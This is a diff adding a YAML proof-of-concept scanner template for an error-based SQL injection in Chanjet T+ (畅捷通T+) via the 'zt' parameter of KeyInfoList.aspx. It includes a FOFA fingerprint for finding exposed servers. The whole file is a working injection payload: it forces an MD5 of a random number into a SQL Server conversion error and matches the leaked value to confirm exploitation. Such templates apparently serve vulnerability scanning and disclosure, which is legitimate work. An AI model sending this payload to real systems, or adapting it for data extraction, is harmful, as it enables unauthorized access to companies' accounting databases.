@@ -1,0 +1,25 @@
+id: poc-yaml-changjie-tplus-keyinfolist-aspx-sqli
+info:
+  name: 畅捷通T+ KeyInfoList.aspx SQL漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 畅捷通T+
+  fofa: app="畅捷通-TPlus"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=%27)AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27)))--+
+  expression: 'status_code == 200 &&
+
+    contains(body,"在将 nvarchar 值") &&
+
+    contains(body,t2) &&
+
+    contains(body,"转换成数据类型 int 时失败")
+
+    '
+transport: http
